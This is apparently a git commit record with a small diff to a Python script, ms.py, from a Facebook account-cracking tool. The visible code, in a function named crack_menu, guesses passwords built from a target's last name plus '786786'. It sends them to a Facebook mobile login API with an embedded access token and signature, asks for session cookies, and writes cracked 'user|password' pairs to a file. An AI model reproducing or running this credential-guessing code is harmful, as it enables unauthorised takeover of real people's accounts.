bf780a6c80b86b45c91197759626b134253faf14
Abdlii <90677442+Abdlii@users.noreply.github.com>
2021-09-14 10:03:36 +0000

    Create ms.py

--- ms.py
+++ ms.py
@@ -343,7 +343,7 @@ def crack_menu():
                                         crt.write(user + '|' + pass7 + '\n')
                                         crt.close()
                                         checkpoint.append(user + pass7)
-                                        else:
+                                 else:
                                     pass8 = b['last_name'] + '786786'
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     q = json.load(data)
